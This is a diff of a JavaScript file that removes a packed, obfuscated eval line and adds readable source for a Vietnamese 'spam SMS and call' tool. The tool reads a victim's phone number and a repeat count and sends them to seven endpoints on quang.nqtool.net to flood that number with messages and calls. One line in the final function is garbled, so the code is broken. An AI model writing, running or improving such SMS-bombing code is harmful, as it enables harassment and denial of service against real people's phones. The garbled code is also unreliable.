@@ -1,1 +1,76 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('A j=[];A l=z;a b=[\'e://d.c.f/?\',\'e://d.c.f/1d.h?\',\'e://d.c.f/1c.h?\',\'e://d.c.f/1b.h?\',\'e://d.c.f/19.h?\',\'e://d.c.f/10.h?\',\'e://d.c.f/1a.h?\'];k W(){a 7=i.n(\'7\').F;a 8=i.n(\'8\').F;s(7&&8){j.X({7,8});K();s(!l){o()}}}k o(){s(j.U===0){l=z;Y}l=R;a{7,8}=j.T();a 9=i.Q(\'P\');9.p=`BắtĐầu ${7}(${8}8)`;i.n(\'I-O\').N(9);G(7,8,9)}k G(7,8,9){a D=[`${b[0]}7=${7}&g=${8}`,`${b[1]}7=${7}&g=${8}`,`${b[2]}7=${7}&g=${8}`,`${b[3]}7=${7}&g=${8}`,`${b[4]}7=${7}&g=${8}`,`${b[5]}7=${7}&g=${8}`,`${b[6]}7=${7}&g=${8}`];17.12(D.E(H=>13(H).x(m=>m.14()))).x(y=>{a M=y.E((m,r)=>`S${r+1}-${m.15}`).16(\', \');9.p=`LàJ Côw ${7}:${M}`;o()}).11(18=>{9.p=`LàJ Côw ${7}`;o()})}k K(){a q=i.n(\'I-O\');q.V=\'\';j.Z((v,r)=>{a 9=i.Q(\'P\');1eồw:${v.7}(${v.8}8)`;q.N(9)})}',62,77,'|||||||phone|times|listItem|const|urls|nqtool|quang|https|net|amout|php|document|queue|function|processing|response|getElementById|processQueue|innerText|statusList|index|if|||item|ng|then|responses|false|let|||urlsToFetch|map|value|spamSmsAndCall|url|status|nh|updateStatusBar|Th|messages|appendChild|list|li|createElement|true|URL|shift|length|innerHTML|addToQueue|push|return|forEach|index5|catch|all|fetch|json|message|join|Promise|error|index4|index6|index3|index2|index1|listItLu'.split('|'),0,{}))
+let queue = [];
+let processing = false;
+
+// Bản quyền của quang
+const urls = [
+    'https://quang.nqtool.net/?',
+    'https://quang.nqtool.net/index1.php?',
+    'https://quang.nqtool.net/index2.php?',
+    'https://quang.nqtool.net/index3.php?',
+    'https://quang.nqtool.net/index4.php?',
+    'https://quang.nqtool.net/index5.php?',
+    'https://quang.nqtool.net/index6.php?'
+];
+
+function addToQueue() {
+    const phone = document.getElementById('phone').value;
+    const times = document.getElementById('times').value;
+
+    if (phone && times) {
+        queue.push({ phone, times });
+        updateStatusBar();
+        if (!processing) {
+            processQueue();
+        }
+    }
+}
+
+function processQueue() {
+    if (queue.length === 0) {
+        processing = false;
+        return;
+    }
+
+    processing = true;
+    const { phone, times } = queue.shift();
+
+    const listItem = document.createElement('li');
+    listItem.innerText = `Bắt Đầu ${phone} (${times} times)`;
+    document.getElementById('status-list').appendChild(listItem);
+
+    spamSmsAndCall(phone, times, listItem);
+}
+
+function spamSmsAndCall(phone, times, listItem) {
+    // Create URLs for API requests
+    const urlsToFetch = [
+        `${urls[0]}phone=${phone}&amout=${times}`,
+        `${urls[1]}phone=${phone}&amout=${times}`,
+        `${urls[2]}phone=${phone}&amout=${times}`,
+        `${urls[3]}phone=${phone}&amout=${times}`,
+        `${urls[4]}phone=${phone}&amout=${times}`,
+        `${urls[5]}phone=${phone}&amout=${times}`,
+        `${urls[6]}phone=${phone}&amout=${times}`
+    ];
+
+    Promise.all(urlsToFetch.map(url => fetch(url).then(response => response.json())))
+    .then(responses => {
+        const messages = responses.map((response, index) => `URL${index + 1} - ${response.message}`).join(', ');
+        listItem.innerText = `Thành Công ${phone}: ${messages}`;
+        processQueue();
+    })
+    .catch(error => {
+        listItem.innerText = `Thành Công ${phone}`;
+        processQueue();
+    });
+}
+
+function updateStatusBar() {
+    const statusList = document.getElementById('status-list');
+    statusList.innerHTML = ''; // Clear luồng
+    queue.forEach((item, index) => {
+        const listItem = document.createElement('li');
+        listItLuồng: ${item.phone} (${item.times} times)`;
+        statusList.appendChild(listItem);
+    });
+}
